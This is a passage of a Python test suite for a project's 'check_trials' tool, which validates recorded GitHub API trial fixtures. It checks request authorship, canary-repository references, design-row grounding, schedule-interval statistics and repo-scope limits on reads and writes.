    def test_a_call_of_a_repo_in_a_fixture_of_the_org_is_one_problem_whoever_asked(self):
        # The pairing is read once for the fixture, not once for each exchange, and an asker that cannot be read
        # neither hides it nor repeats it. The schema refuses such an asker first, so the pairing is read directly.
        reach = json.loads((ROOT / "trials" / "P-39.reach.json").read_text())
        reach["exchanges"][2]["request"]["call"] = "GET /repos/combsmith/software-factory/installation"
        self.assertEqual([where for where, _ in check_trials._askers(reach)], ["exchanges[2].request.call"])
        reach["exchanges"][0]["request"]["as"] = "combsmith-sf-controller"
        reach["exchanges"][1]["request"]["as"] = None
        org = [where for where, what in check_trials._askers(reach) if "is not a REST call of the org or its Apps" in what]
        self.assertEqual(org, ["exchanges[2].request.call"])
        problems = check_trials.run(clone({"trials/P-39.reach.json": json.dumps(reach)}))
        self.assertTrue(caught(problems, "trials/P-39.reach.json: $.exchanges[0].request.as: expected object"))

    def test_an_asker_named_by_an_address_is_caught(self):
        # Decision 0033: a fixture names who asked in words, never by an address that ties it to an account.
        vendor = json.loads((ROOT / "examples" / "trial.a-vendors-cli.json").read_text())
        vendor["exchanges"][0]["request"]["as"]["name"] = "account@example.com"
        problems = check_trials.run(clone({"trials/P-13.json": json.dumps(vendor),
                                           "examples/trial.a-vendors-cli.json": json.dumps(vendor)}))
        for where in ("trials/P-13.json", "examples/trial.a-vendors-cli.json"):
            self.assertTrue(caught(problems, where + ": exchanges[0].request.as.name looks like an address"), where)
        data = json.loads(fixture())
        data["exchanges"][1]["request"]["as"]["name"] = "combsmith-sf-trial@users.noreply.github.com"
        problems = check_trials.run(clone({"trials/P-12.json": json.dumps(data)}))
        self.assertTrue(caught(problems, "trials/P-12.json: exchanges[1].request.as.name looks like an address"))
        self.assertFalse(caught(problems, "exchanges[0].request.as.name"))

    def test_code_that_reads_the_canary_is_caught(self):
        name = "combsmith/" + check_trials.CANARY
        root = clone({"tools/fetch.py": "REPO = %r\n" % name, ".github/workflows/trial.yml": "repository: %s\n" % name,
                      "Makefile": "trial:\n\tgh api repos/%s\n" % name, "config/where.json": '{"repo": "%s"}' % name,
                      "docs/notes.md": name + "\n", "README.md": name + "\n", "trials/P-12.json": fixture(),
                      "sim/deep/er/x.py": name, "corpus/x.json": name,
                      ".claude/worktrees/other/.git": "gitdir: elsewhere\n", ".claude/worktrees/other/tools/x.py": name})
        problems = check_trials.run(root)
        for where in ("tools/fetch.py", ".github/workflows/trial.yml", "Makefile", "config/where.json", "sim/deep/er/x.py"):
            self.assertTrue(caught(problems, where + ": names the canary repo"), where)
        # Another working tree, and the corpus make_corpus.py writes, are not this repo's: tools/walk.py skips both.
        for where in ("docs/notes.md", "README.md", "trials/P-12.json", "examples/trial.json", "trial.schema.json", "worktrees",
                      "corpus", "config/apps.json", "schemas/apps.schema.json", "examples/invalid/apps."):
            self.assertFalse(caught(problems, where), where)

    def test_a_fixture_named_for_a_rule_must_exist_and_validate(self):
        problems = check_trials.run(clone({"sim/grounding.py": grounded("trials/P-18.json")}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: trials/P-18.json does not exist"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("trials/P-18.json"), "trials/P-18.json": "{}"}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: trials/P-18.json is not a valid fixture"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("trials/P-12.json"), "trials/P-12.json": fixture()}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: trials/P-12.json records P-12, and P-18 asks this"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("examples/trial.json")}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: examples/trial.json is not a fixture in trials/"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("trials/P-18.json", "()"),
                                           "trials/P-18.json": fixture(trial="P-18")}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: no trial asks this; add one to section 6 first"))
        root = clone({"sim/grounding.py": grounded("trials/P-18.json", '("P-7", "P-18")'),
                      "trials/P-18.json": fixture(trial="P-18")})
        self.assertEqual(check_trials.run(root), [])
        self.assertFalse(caught(check_trials.unverified(root), "a_killed_job_times_out"))
        self.assertTrue(caught(check_trials.unverified(), "a_killed_job_times_out"))

    def test_a_rule_names_only_a_trial_whose_row_asks_it(self):  # issue 265
        # Each trial a rule names asks it in its row of section 6: the rule quotes, in ASKS, the words of the row's
        # question that do, four at least. A rule with no quote of its trial, a quote that is not in that row's
        # question, its answer among the rest, or one too short to name a question, is refused.
        quote = '"a_request_for_changes_survives_a_push": {"P-41": "does a request for changes survive the push"}'
        self.assertEqual(GROUNDING.count(quote), 1)
        for broken, why in ((quote.replace("does a request for changes survive the push", ""), "no quote"),
                            (quote.replace("survive the push", "survive the merge"), "not the question"),
                            (quote.replace("does a request for changes survive the push", "the push"), "too short"),
                            (quote.replace("does a request for changes survive the push", "request for changes"),
                             "three words"),
                            (quote.replace("does a request for changes survive the push", "es a request for chan"),
                             "not whole words"),
                            (quote.replace("does a request for changes survive the push",
                                          "If a request for changes does not survive a push"), "the answer")):
            problems = check_trials.run(clone({"sim/grounding.py": GROUNDING.replace(quote, broken)}))
            self.assertTrue(caught(problems, "a_request_for_changes_survives_a_push: P-41's row in section 6 does not "
                                             "ask it"), why)
        missing = GROUNDING.replace(quote + ",\n", "")
        self.assertNotEqual(missing, GROUNDING)
        self.assertTrue(caught(check_trials.run(clone({"sim/grounding.py": missing})),
                               "a_request_for_changes_survives_a_push: P-41's row in section 6 does not ask it"))
        # A row whose question stops asking it refuses the rule too, though the quote is unchanged.
        design = (ROOT / check_trials.DESIGN).read_text()
        reworded = design.replace("does a request for changes survive the push", "is a request for changes kept", 1)
        self.assertNotEqual(reworded, design)
        self.assertTrue(caught(check_trials.run(clone({check_trials.DESIGN: reworded})),
                               "a_request_for_changes_survives_a_push: P-41's row in section 6 does not ask it"))
        # Four words are enough, as the question gives them.
        self.assertEqual(check_trials.run(clone({"sim/grounding.py": GROUNDING.replace(
            quote, quote.replace("does a request for changes survive the push", "request for changes survive"))})), [])
        # A second row for the trial, later in section 6, is refused, and answers no quote the first does not.
        second = reworded.replace("\n## 7. ", "\n| P-41 | does a request for changes survive the push | x |\n\n## 7. ", 1)
        self.assertNotEqual(second, reworded)
        self.assertTrue(caught(check_trials.run(clone({check_trials.DESIGN: second})),
                               "section 6 has more than one row for P-41; a trial has one"))
        # A row fenced with tildes, or in an HTML comment, holds no row either; nor does a fence indented up to three
        # spaces, or a longer one, which a shorter line does not close (the second-family read of #384).
        for hidden in ("~~~\n%s\n~~~", "<!--\n%s\n-->", "   ```\n%s\n   ```", "````\n```\n%s\n````",
                       "~~~~\n~~~\n%s\n~~~~"):
            veiled = reworded.replace("\n## 7. ", "\n" + hidden % "| P-41 | does a request for changes survive the push | x |"
                                      + "\n\n## 7. ", 1)
            problems = check_trials.run(clone({check_trials.DESIGN: veiled}))
            self.assertTrue(caught(problems, "a_request_for_changes_survives_a_push: P-41's row in section 6 does not "
                                             "ask it"), hidden)
            self.assertFalse(caught(problems, "more than one row"), hidden)
        # The blocks are read in one pass from the top, as a renderer reads them: a fence inside a comment, or a
        # comment's close inside a block, ends nothing, and the row the tildes hold is hidden still (the second-family
        # read of #357).
        nested = "<!--\n```\n-->\n~~~\n```\n-->\n%s\n<!--\n~~~\n-->" % "| P-41 | does a request for changes survive the push | x |"
        problems = check_trials.run(clone({check_trials.DESIGN: reworded.replace("\n## 7. ", "\n" + nested + "\n\n## 7. ", 1)}))
        self.assertTrue(caught(problems, "a_request_for_changes_survives_a_push: P-41's row in section 6 does not ask it"))
        self.assertFalse(caught(problems, "more than one row"))
        # A question is its cell alone: a cell whose close lacks its space does not run on into the next.
        start = reworded.index("| P-41 | ")
        for row in ("| P-41 | is a request for changes kept |does a request for changes survive the push | x |",
                    "| P-41 | is a request for changes kept \ndoes a request for changes survive the push | x |"):
            run_on = reworded[:start] + row + reworded[reworded.index("\n", start):]
            self.assertTrue(caught(check_trials.run(clone({check_trials.DESIGN: run_on})),
                                   "a_request_for_changes_survives_a_push: P-41's row in section 6 does not ask it"), row)
        # A pipe escaped is the cell's own, and the question goes on past it.
        piped = design.replace("does a request for changes survive the push", "does a request for changes survive the push, a\\|b", 1)
        self.assertNotEqual(piped, design)
        self.assertEqual(check_trials.run(clone({check_trials.DESIGN: piped})), [])
        # An opener left unclosed hides every row after it, as a renderer reads it: those trials have no row.
        for opener in ("<!--", "~~~", "```", "   ```"):
            unclosed = design.replace("| P-41 |", opener + "\n| P-41 |", 1)
            self.assertTrue(caught(check_trials.run(clone({check_trials.DESIGN: unclosed})),
                                   "a_request_for_changes_survives_a_push: P-41 has no row in section 6"), opener)
        # A block that is closed hides only itself: the rows after it are read as before.
        for block in ("```\nx\n```", "~~~\nx\n~~~", "<!-- x -->", "   ```\nx\n   ```", "````\n```\n````"):
            closed = design.replace("| P-41 |", block + "\n| P-41 |", 1)
            self.assertEqual(check_trials.run(clone({check_trials.DESIGN: closed})), [], block)
        # A row in a fenced block asks nothing, though it quotes the old question.
        row = reworded.index("\n", reworded.index("| P-41 |"))
        fenced = reworded[:row] + "\n```\n| P-41 | does a request for changes survive the push | Yes |\n```" + reworded[row:]
        self.assertTrue(caught(check_trials.run(clone({check_trials.DESIGN: fenced})),
                               "a_request_for_changes_survives_a_push: P-41's row in section 6 does not ask it"))
        # What #265 found: a rule that names a trial whose row asks something else, as the_timeline_shows_each_act named
        # P-8, whose row asks the cost of a pass and the cadence of ticks, is refused until a row asks it.
        p8 = GROUNDING.replace('("P-2", "P-41"), None, None)', '("P-8",), None, None)', 1)
        self.assertNotEqual(p8, GROUNDING)
        self.assertTrue(caught(check_trials.run(clone({"sim/grounding.py": p8})),
                               "the_timeline_shows_each_act: P-8's row in section 6 does not ask it"))
        # A quote is of a trial its rule names, of a rule that is listed, and ASKS is a literal of that shape.
        extra = GROUNDING.replace(quote, quote[:-1] + ', "P-9": "Can a pass start the next one"}')
        self.assertTrue(caught(check_trials.run(clone({"sim/grounding.py": extra})),
                               "ASKS quotes P-9 for a_request_for_changes_survives_a_push, which names no such trial"))
        stray = GROUNDING.replace("ASKS = {", 'ASKS = {\n    "a_rule_never_listed": {"P-41": "does a request for changes"},', 1)
        self.assertTrue(caught(check_trials.run(clone({"sim/grounding.py": stray})),
                               "ASKS quotes P-41 for a_rule_never_listed, which is no rule"))
        # A trial that is not a string is reported, never raised on.
        odd = GROUNDING.replace(quote, quote[:-1] + ', 1: "x", "P-9": "y"}')
        self.assertTrue(caught(check_trials.run(clone({"sim/grounding.py": odd})), "ASKS quotes 1 for"))
        for shape in ("ASKS = []\n", "ASKS = {'x': 'y'}\n", "ASKS = dict()\n"):
            body = GROUNDING[:GROUNDING.index("\nASKS = {")] + "\n" + shape
            self.assertTrue(caught(check_trials.run(clone({"sim/grounding.py": body})), "ASKS"), shape)
        self.assertTrue(caught(check_trials.run(clone({"sim/grounding.py": GROUNDING[:GROUNDING.index("\nASKS = {")]})),
                               "sim/grounding.py: holds no ASKS"))
        # Every rule this repo lists quotes each trial it names, and nothing more.
        self.assertEqual(check_trials.run(), [])
        listed = {code: trials for code, _, trials, _, _ in check_trials.rules()}
        self.assertEqual({(c, t) for c, by in check_trials.asks().items() for t in by},
                         {(c, t) for c, trials in listed.items() for t in trials})

    def test_a_rule_may_be_grounded_by_a_tuple_of_fixtures_each_held_to_the_same_rules(self):
        # The last pusher is read from a person's push (P-28.json) and from an App's (P-28.app.json): one rule, two
        # fixtures, each of which must exist, validate and record a trial that asks the rule.
        both = grounded('("trials/P-18.json", "trials/P-18.app.json")')
        root = clone({"sim/grounding.py": both, "trials/P-18.json": fixture(trial="P-18"),
                      "trials/P-18.app.json": fixture(trial="P-18")})
        self.assertEqual(check_trials.run(root), [])
        self.assertFalse(caught(check_trials.unverified(root), "a_killed_job_times_out"))
        problems = check_trials.run(clone({"sim/grounding.py": both, "trials/P-18.json": fixture(trial="P-18")}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: trials/P-18.app.json does not exist"))
        problems = check_trials.run(clone({"sim/grounding.py": both, "trials/P-18.json": fixture(trial="P-18"),
                                           "trials/P-18.app.json": fixture(trial="P-12")}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: trials/P-18.app.json is not a valid fixture"))
        # A valid fixture of another trial, second in the tuple: each fixture must record a trial that asks the rule.
        problems = check_trials.run(clone({"sim/grounding.py": grounded('("trials/P-18.json", "trials/P-12.json")'),
                                           "trials/P-18.json": fixture(trial="P-18"), "trials/P-12.json": fixture()}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: trials/P-12.json records P-12, and P-18 asks this"))
        problems = check_trials.run(clone({"sim/grounding.py": grounded("()"), "trials/P-18.json": fixture(trial="P-18")}))
        self.assertTrue(caught(problems, "a_killed_job_times_out: an empty tuple grounds nothing; write None"))

    def test_the_approval_trials_ground_the_rules_they_asked(self):
        # The sitting of 2026-10-19: P-7 passed with the App's push and the machine user's approval of it, and P-28
        # read the App's push. Under the canary's ruleset the App's push dismissed the approval, naming the App, and P-7
        # grounds the rule the fake now applies where the world's ruleset dismisses stale approvals (issue 265).
        by_code = {code: (trials, fixture) for code, _, trials, fixture, _ in check_trials.rules()}
        self.assertEqual(by_code["an_app_pushes_to_the_head"], (("P-7",), "trials/P-7.json"))
        self.assertEqual(by_code["the_machine_users_approval_counts"], (("P-7",), "trials/P-7.json"))
        self.assertEqual(by_code["the_pusher_is_the_last_pusher"], (("P-28",), ("trials/P-28.json", "trials/P-28.app.json")))
        self.assertEqual(by_code["an_approval_is_dismissed_by_a_push"], (("P-7",), "trials/P-7.json"))
        self.assertFalse(caught(check_trials.unverified(), "an_approval_is_dismissed_by_a_push"))
        self.assertEqual(by_code["an_approval_stands_without_stale_dismissal"], (("P-1",), None))
        for name in ("P-1", "P-7", "P-7.maintainer-pushed", "P-24", "P-28.app"):
            data = json.loads((ROOT / "trials" / ("%s.json" % name)).read_text())
            self.assertEqual(data["verdict"], "pass", name)
            self.assertEqual(data["ran_at"][:10], "2026-10-19", name)

    def test_the_tick_probes_intervals_are_held_to_its_runs(self):
        # Decision 0011 and issue 25: the probe's runs, read once, give the intervals set against W-2. The fixture's
        # analysis is recomputed here from the runs the read it rests on returned, the read's own date and the moment
        # the probe reached main (#208, d78f0bc), W-2's 15 minutes held to the design and not to the fixture; and the
        # rule the fake applies, a_tick_can_be_lost, is grounded by it.
        from datetime import datetime, timedelta, timezone
        data = json.loads((ROOT / "trials" / "P-8.ticks.json").read_text())
        by_code = {code: fixture for code, _, _, fixture, _ in check_trials.rules()}
        self.assertEqual(by_code["a_tick_can_be_lost"], "trials/P-8.ticks.json")
        early, final, computed = data["exchanges"]
        self.assertIn("by mistake", early["request"]["call"])
        self.assertIn("rests on", final["request"]["call"])
        self.assertEqual(computed["request"]["via"], "cli")
        runs = sorted(final["response"]["body"]["workflow_runs"], key=lambda r: r["run_started_at"])
        self.assertEqual(final["response"]["body"]["total_count"], len(runs))
        self.assertNotIn("link", final["response"]["headers"])
        self.assertTrue(all(r["event"] == "schedule" for r in runs))
        result = computed["response"]["body"]["result"]
        when = lambda s: datetime.strptime(s, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=timezone.utc)
        starts = [when(r["run_started_at"]) for r in runs]
        gaps = [(b - a).total_seconds() / 60 for a, b in zip(starts, starts[1:])]
        ordered = sorted(gaps)
        p95 = ordered[min(len(ordered) - 1, -(-19 * len(ordered) // 20) - 1)]      # the value at rank ceil(0.95 x n)
        median = (ordered[len(ordered) // 2] + ordered[(len(ordered) - 1) // 2]) / 2
        on_main = datetime(2026, 10, 19, 18, 48, 29, tzinfo=timezone.utc)
        read_at = datetime.strptime(final["response"]["headers"]["date"], "%a, %d %b %Y %H:%M:%S GMT").replace(tzinfo=timezone.utc)
        self.assertEqual(result["probe_on_main_at"], "2026-10-19T18:48:29Z")
        self.assertEqual(result["read_at"], read_at.strftime("%Y-%m-%dT%H:%M:%SZ"))
        self.assertEqual(result["first_run_at"], runs[0]["run_started_at"])
        self.assertEqual(result["last_run_at"], runs[-1]["run_started_at"])
        self.assertEqual(result["minutes_from_main_to_first_run"], round((starts[0] - on_main).total_seconds() / 60, 1))
        self.assertEqual(result["gap_from_last_run_to_the_read_minutes"], round((read_at - starts[-1]).total_seconds() / 60, 1))
        self.assertGreaterEqual(read_at - starts[0], timedelta(hours=24))
        self.assertTrue(result["created_at_equals_run_started_at_for_every_run"])
        self.assertTrue(all(r["created_at"] == r["run_started_at"] for r in runs))
        self.assertEqual(result["ticks_arrived"], len(runs))
        self.assertEqual(result["intervals_between_runs_minutes"], [round(g, 1) for g in gaps])
        self.assertEqual(result["interval_minutes"], {"least": round(min(gaps), 1), "median": round(median, 1),
                                                      "p95_by_nearest_rank": round(p95, 1), "longest": round(max(gaps), 1)})
        cursor, due = on_main.replace(second=0, microsecond=0), 0
        while cursor <= read_at:
            due += cursor >= on_main and cursor.minute % 5 == 2
            cursor += timedelta(minutes=1)
        self.assertEqual(result["ticks_due_from_main_to_the_read"], due)
        self.assertGreater(due, len(runs))
        self.assertEqual(result["share_arrived"], round(len(runs) / due, 3))
        self.assertEqual(result["W2_minutes_at_p95"], 15)
        self.assertEqual(result["schedule_alone_meets_W2"], p95 <= 15)
        self.assertEqual(data["verdict"], "pass" if p95 <= 15 else "fail")
        # The probe is gone with its exemption, as the story says once the verdict is recorded.
        self.assertFalse((ROOT / ".github" / "workflows" / "tick-probe.yml").exists())
        self.assertNotIn("tick-probe.yml", check_workflows.EXEMPT)
        self.assertEqual(sorted(check_workflows.EXEMPT), ["ci.yml"])

    def test_the_batch_2c_trials_ground_their_rules_on_what_the_runs_show(self):
        # Issue 187: P-27, P-9 and P-20 ground a rule each, and each answer is recomputed here from the run records and
        # the Date headers the fixture holds, never from its own summary. P-14 and P-4 ground no rule: §4.9 and §5.1
        # cite them, and P-4's fail is on the repository subset alone.
        from datetime import datetime, timezone
        when = lambda s: datetime.strptime(s, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=timezone.utc)
        header = lambda e: datetime.strptime(e["response"]["headers"]["date"], "%a, %d %b %Y %H:%M:%S GMT").replace(tzinfo=timezone.utc)
        load = lambda t: json.loads((ROOT / "trials" / ("%s.json" % t)).read_text())
        canary = "combsmith/" + check_trials.CANARY
        by_code = {rule[0]: rule[3] for rule in check_trials.rules()}
        self.assertEqual(by_code["a_forks_run_never_counts"], "trials/P-27.json")
        self.assertEqual(by_code["a_pass_starts_its_successor"], "trials/P-9.json")
        self.assertEqual(by_code["a_public_event_starts_a_pass"], "trials/P-20.json")
        calls = lambda f, end: [e for e in f["exchanges"] if e["request"]["call"].split(",")[0].endswith(end)]

        # P-27 (a): the outside account's run waited, then ran as a second attempt a person triggered.
        p27 = load("P-27")
        waiting = [e for e in p27["exchanges"] if e["request"]["call"].endswith("/39534671364, before any approval")][0]["response"]["body"]
        approved = [e for e in p27["exchanges"] if e["request"]["call"].endswith("/39534671364, after the approval")][0]["response"]["body"]
        self.assertEqual((waiting["status"], waiting["conclusion"], waiting["head_repository"]["fork"]), ("completed", "action_required", True))
        self.assertNotIn(waiting["actor"]["login"], ("don-petry", "donpetry-bot"))
        self.assertEqual((approved["conclusion"], approved["run_attempt"], approved["triggering_actor"]["login"]), ("success", 2, "don-petry"))
        # P-27 (b): every fork run is a pull request's; the fork's own file was refused a dispatch; no schedule ran.
        runs = calls(p27, "actions/runs?event=pull_request&per_page=100")[0]["response"]["body"]["workflow_runs"]
        forks = [r for r in runs if (r.get("head_repository") or {}).get("fork")]
        self.assertTrue(any(r["path"] == ".github/workflows/p27-fork.yml" for r in forks))
        self.assertTrue(all(r["event"] == "pull_request" for r in forks))
        self.assertIn(calls(p27, "p27-fork.yml/dispatches")[0]["response"]["status"], (404, 422))
        self.assertEqual(calls(p27, "actions/runs?event=schedule&per_page=100")[0]["response"]["body"]["total_count"], 0)
        dispatched = calls(p27, "actions/runs?event=workflow_dispatch&per_page=100")[0]["response"]["body"]["workflow_runs"]
        self.assertTrue(dispatched)
        self.assertFalse([r for r in dispatched if r["path"].endswith("p27-fork.yml") or (r.get("head_repository") or {}).get("fork")])
        heads = {r["path"]: r["head_branch"] for r in forks if r["head_repository"]["full_name"].startswith("don-petry/")}
        self.assertEqual(heads.get(".github/workflows/p27-fork.yml"), "p27-fork")
        self.assertEqual(waiting["head_branch"], "p27-outside")
        self.assertEqual(p27["verdict"], "pass")

        # P-9: the job's own dispatch was answered 204 and the next run, a dispatch, was listed within 60 seconds of it.
        p9 = load("P-9")
        job = [e for e in p9["exchanges"] if e["request"]["as"]["kind"] == "workflow"][0]
        second = calls(p9, "actions/runs/39532289509")[0]["response"]["body"]
        self.assertEqual(job["response"]["status"], 204)
        self.assertEqual(second["event"], "workflow_dispatch")
        first = calls(p9, "actions/runs/39532278207")[0]["response"]["body"]
        self.assertEqual(second["actor"]["login"], "github-actions[bot]")
        self.assertTrue(0 <= (when(second["created_at"]) - header(job)).total_seconds() <= 60)
        # The ruling asks that the second run name the first run's actor; it does not, so P-9 fails on that clause.
        self.assertNotEqual(second["actor"]["login"], first["actor"]["login"])
        self.assertEqual(p9["verdict"], "fail")

        # P-20: at least eight of ten stars have their own run within 120 seconds of the star's answer.
        p20 = load("P-20")
        stars = [header(e) for e in p20["exchanges"] if e["request"]["call"].startswith("PUT /user/starred/")]
        created = sorted(when(r["created_at"]) for r in calls(p20, "p20-watch.yml/runs?per_page=100")[0]["response"]["body"]["workflow_runs"]
                         if r["event"] == "watch")
        self.assertEqual(len(stars), 10)
        used = set()
        for at in stars:
            match = [c for c in created if c not in used and 0 <= (c - at).total_seconds() <= 120]
            if match:
                used.add(match[0])
        delays = []
        used = set()
        for at in stars:
            match = [c for c in created if c not in used and 0 <= (c - at).total_seconds() <= 120]
            if match:
                used.add(match[0])
            delays.append(round((match[0] - at).total_seconds()) if match else None)
        self.assertGreaterEqual(len(used), 8)
        self.assertEqual(p20["exchanges"][-1]["response"]["body"]["seconds_from_star_to_run"], delays)
        self.assertEqual(p20["verdict"], "pass")

        # P-14: the job's token was refused the write, no cache-service token reached the step, and no cache exists.
        p14 = load("P-14")
        self.assertEqual(calls(p14, "actions/caches?key=p14-none")[0]["response"]["status"], 403)
        step = [e for e in p14["exchanges"] if e["request"]["call"].startswith("The step's environment")][0]["response"]["body"]
        self.assertEqual(step["runner_cache_access_in_a_run_step"], "not set")
        self.assertEqual(calls(p14, "actions/caches")[-1]["response"]["body"]["total_count"], 0)
        self.assertEqual(p14["verdict"], "pass")

        # P-4: in the second run the permissions subset held and the repository subset did not narrow a public read.
        p4 = load("P-4")
        second_run = [e for e in p4["exchanges"] if "the second run" in e["request"]["call"]]
        status = {e["request"]["call"].split(",")[0]: e["response"]["status"] for e in second_run}
        self.assertEqual(status["GET /repos/%s/contents/" % canary], 200)
        self.assertEqual(status["PUT /repos/%s/contents/p4/trial.md" % canary], 403)
        self.assertEqual(status["GET /repos/combsmith/software-factory/contents/"], 200)
        mint = [e for e in second_run if "/access_tokens" in e["request"]["call"]][0]
        self.assertEqual(mint["request"]["body"], {"repositories": [check_trials.CANARY], "permissions": {"contents": "read"}})
        self.assertEqual(mint["response"]["status"], 201)
        self.assertEqual(mint["response"]["body"]["permissions"], {"contents": "read", "metadata": "read"})
        self.assertEqual(mint["response"]["body"]["repository_selection"], "selected")
        self.assertEqual([r["full_name"] for r in mint["response"]["body"]["repositories"]], [canary])
        self.assertEqual(p4["verdict"], "fail")
        design = (ROOT / "docs" / "architecture" / "software-factory-design.md").read_text()
        for cited in ("(P-4, `trials/P-4.json`)", "(P-14, `trials/P-14.json`)", "(P-9, `trials/P-9.json`)",
                      "P-27, `trials/P-27.json`)", "(P-20,\n  `trials/P-20.json`)"):
            self.assertIn(cited, design)

    def test_a_write_is_recorded_only_on_a_node_a_read_of_the_org_answered(self):
        # Window 2's answers are GraphQL writes, which name a node and no repo: a fixture may record one of WRITES, by
        # its one `id`, on a node a read of the canary alone in the same fixture answered, and nothing else.
        data = json.loads((ROOT / "examples" / "invalid" / "trial.a-write-on-a-node-no-read-answered.json").read_text())
        data["exchanges"][1]["request"]["body"]["variables"]["id"] = data["exchanges"][0]["response"]["body"]["node_id"]
        self.assertEqual(check_trials.fixture_problems(data), [])
        for field, key in check_trials.WRITES.items():
            query = "mutation($id: ID!) { %s(input: {%s: $id}) { clientMutationId } }" % (field, key)
            self.assertEqual(check_trials.written({"via": "graphql", "body": {"query": query, "variables": {"id": "N"}}}),
                             (field, "N"))
            for wrong in (query.replace(key, "other"), query + " query { viewer { login } }", query.replace("$id", '"N"', 1)):
                self.assertIsNone(check_trials.written({"via": "graphql", "body": {"query": wrong, "variables": {"id": "N"}}}))
        # A merge method rides only on auto-merge; and a node id names its repository, read as GitHub writes it.
        merged = "mutation($id: ID!) { enqueuePullRequest(input: {pullRequestId: $id, mergeMethod: SQUASH}) { clientMutationId } }"
        self.assertIsNone(check_trials.written({"via": "graphql", "body": {"query": merged, "variables": {"id": "N"}}}))
        self.assertEqual(check_trials.node_repo("PR_kwDOVFD6788AAAABLI32PA"), check_trials.CANARY_ID)
        self.assertEqual(check_trials.node_repo("PRRT_kwDOVFD6786w86vx"), check_trials.CANARY_ID)
        for unreadable in ("", "PR_", "PR_!!", "MDExOlB1bGxSZXF1ZXN0MQ==", "PR_AAAA"):
            self.assertIsNone(check_trials.node_repo(unreadable), unreadable)
        # The node a read answered is held only when that read is of the canary alone.
        outside = json.loads(json.dumps(data))
        outside["exchanges"][0]["request"]["call"] = "GET /repos/outside/x/pulls/7"
        self.assertTrue(any("on a node no read" in p for p in check_trials.fixture_problems(outside)))

    def test_a_cost_measurements_exchanges_name_each_repo_they_span(self):
        # Decision 0035, held in tools/check_trials.py since issue 226: a fixture of the canary reads the org's repos
        # alone and is answered with them alone, and an App's read names, and is answered with, only repos its
        # installation reaches. Each way round that rule has a counter-example under examples/invalid, refused by the
        # check in exactly one way and named for it; the check finds nothing wrong with the fixtures on main.
        refused = {
            "a-second-root-call-behind-an-escaped-quote": "names the owner outside",
            "a-read-of-a-users-repos": "names no repo of the org, nor the org, an App or an installation",
            "a-read-by-repository-id": "names no repo of the org",
            "a-search-of-another-users-repos": "names no repo of the org",
            "a-command-line-read-of-another-repo": "names the owner outside",
            "an-apps-traversal-beyond-its-reach": "asks of the org by an App, whose installation reaches repos alone",
            "an-apps-read-beyond-its-reach": "asks of combsmith/another-repo, which the App's installation does not reach",
            "a-repo-named-only-by-a-url": "names the repo outside/x; an answer names the org's repos alone",
            "a-repo-named-by-a-resource-path": "names the repo outside/x",
            "a-fragment-on-query": "holds a fragment on Query",
            "an-answer-naming-another-owners-repo": "names the repo outside/x",
            "a-query-of-another-org": "names the owner outside",
            "a-command-line-read-by-an-app": "is app; a command-line read is the Maintainer's own",
            "a-command-line-read-of-another-repos-address": "names the owner outside",
            "a-second-root-call-behind-a-comment": "names the owner outside",
            "a-second-root-call-behind-a-block-string": "names the owner outside",
            "a-read-that-climbs-out-of-the-canary": "climbs out of its repo",
            "a-git-read-of-another-repo": "names the owner outside",
            "an-unknown-apps-read-beyond-the-canary": "asks of combsmith/software-factory, which the App's installation does not reach",
            "an-apps-answer-beyond-its-reach": "names combsmith/another-repo, which the App's installation does not reach",
            # A trial of forks (P-27) may read a fork of the canary, and a trial of reach (P-4) a repo of the org beyond
            # its App's install; neither another owner's repo, and no other trial a fork. A star names its repo.
            "a-fork-of-the-canary-read-outside-a-trial-of-forks": "names the owner someone",
            "a-trial-of-forks-reading-another-owners-repo": "names the owner someone",
            "a-trial-of-reach-reading-another-org": "names the owner outside",
            "a-star-of-another-owners-repo": "names the owner outside",
            # A trial of reach is spared the App's reach and nothing else; a fork licenses no owner a read names at an
            # org's level; a star goes through the same reading as any path.
            "a-trial-of-reach-traversing-the-org": "asks of the org by an App",
            "a-trial-of-forks-reading-an-outside-org": "names the owner outside",
            "a-star-beside-another-read": "names the owner outside",
            "a-star-that-climbs": "climbs out of its repo",
            # A write a trial records is one of WRITES on one node a read of the org's repos in the fixture answered.
            "a-write-on-a-node-no-read-answered": "writes enqueuePullRequest on a node no read",
            "a-write-on-a-node-another-repos-read-answered": "writes enqueuePullRequest on a node no read of the canary alone",
            "a-write-on-another-repos-node-a-canary-read-holds": "on a node that is not the canary's by its id: 999999",
            # However a write is carried, by a command line or inside an answer, it is held as one sent; and a read that
            # also names another repo ties no node to the canary.
            "a-write-carried-by-a-command-line": "carries a GraphQL write that is not one of WRITES",
            "a-write-carried-inside-an-answer-on-another-repos-node": "carries a write of enqueuePullRequest on a node no read",
            "a-write-on-a-node-a-read-naming-another-repo-answered": "writes enqueuePullRequest on a node no read of the canary alone",
            # Only a read answered 200 ties a node, never a refused one or a write's answer; a comment hides no write, nor
            # does another field of a GraphQL body.
            "a-write-on-a-node-a-refused-read-answered": "writes enqueuePullRequest on a node no read of the canary alone",
            "a-write-on-a-node-a-post-answered": "writes enqueuePullRequest on a node no read of the canary alone",
            "a-write-behind-a-comment-in-a-command-line": "carries a GraphQL write that is not one of WRITES",
            "a-write-in-another-field-of-a-graphql-body": "carries a GraphQL write that is not one of WRITES",
            "a-write-the-check-does-not-hold": "a write one of WRITES on one node by `id`",
            "a-second-write-behind-the-first": "a write one of WRITES on one node by `id`",
        }
        for name, words in refused.items():
            data = json.loads((ROOT / "examples" / "invalid" / ("trial.%s.json" % name)).read_text())
            problems = check_trials.fixture_problems(data)
            self.assertEqual(len(problems), 1, (name, problems))
            self.assertIn(words, problems[0], name)
        # A counter-example the schema accepts is held to the check, and the check refuses each of these.
        self.assertEqual([p for p in check_examples.run() if "invalid/trial." in p], [])
        # The reads on main pass, and more than one fixture of the canary is held: the rule is not vacuous.
